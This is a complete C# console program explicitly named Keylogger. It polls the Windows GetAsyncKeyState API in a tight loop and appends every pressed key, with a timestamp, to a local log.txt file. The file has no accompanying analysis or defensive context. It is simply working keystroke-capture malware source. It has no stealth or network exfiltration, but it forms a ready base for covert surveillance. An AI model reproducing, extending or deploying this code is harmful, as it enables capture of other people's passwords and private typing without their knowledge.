using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace Keylogger
{
  class Program
  {
    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern short GetAsyncKeyState(int vKey);

    static void Main(string[] args)
    {
      Console.WriteLine("Keylogger started. Press Ctrl + C to exit.");

      while (true)
      {
        Thread.Sleep(10);
        for (int i = 0; i < 255; i++)
        {
          short keyState = GetAsyncKeyState(i);
          if ((keyState & 0x8000) != 0)
          {
            LogKeyStroke(i);
          }
        }
      }
    }

    private static void LogKeyStroke(int keyCode)
    {
      string logFilePath = AppDomain.CurrentDomain.BaseDirectory + @"\log.txt";
      string keyRepresentation = ConvertKeyCodeToString(keyCode);
      string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff");

      using (StreamWriter sw = new StreamWriter(logFilePath, true))
      {
        sw.WriteLine($"{timestamp} - {keyRepresentation}");
      }
    }

    private static string ConvertKeyCodeToString(int keyCode)
    {
      string keyRepresentation;
      switch (keyCode)
      {
        case 13:
          keyRepresentation = "Enter";
          break;
        case 16:
        case 160:
        case 161:
          keyRepresentation = "Shift";
          break;
        case 17:
        case 162:
        case 163:
          keyRepresentation = "Control";
          break;
        case 18:
        case 164:
        case 165:
          keyRepresentation = "Alt";
          break;
        case 20:
          keyRepresentation = "CapsLock";
          break;
        case 27:
          keyRepresentation = "Escape";
          break;
        case 32:
          keyRepresentation = "Space";
          break;
        case 46:
          keyRepresentation = "Delete";
          break;
        default:
          keyRepresentation = ((char)keyCode).ToString();
          break;
      }

      return keyRepresentation;
    }
  }
}
